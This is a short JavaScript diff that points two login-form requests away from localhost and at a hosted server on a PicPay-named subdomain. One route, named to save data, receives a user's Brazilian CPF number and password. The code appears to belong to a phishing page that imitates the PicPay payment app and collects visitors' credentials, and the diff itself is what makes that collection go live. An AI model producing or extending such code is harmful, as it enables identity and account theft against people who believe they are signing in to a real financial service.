@@ -82,7 +82,7 @@ document.addEventListener('DOMContentLoaded', () => {
             if (!cpf || !senha) return alert('Por favor, preencha todos os campos.');
             
             try {
-                const response = await fetch('http://localhost:3000/salvar-dados', {
+                const response = await fetch('https://picpay-fky2.onrender.com/salvar-dados', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ cpf, senha }),
@@ -109,7 +109,7 @@ document.addEventListener('DOMContentLoaded', () => {
             if (cpf.length < 14) return alert('Por favor, preencha o CPF corretamente.');
 
             try {
-                const response = await fetch('http://localhost:3000/acessar-contratos', {
+                const response = await fetch('https://picpay-fky2.onrender.com/acessar-contratos', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ cpf }),
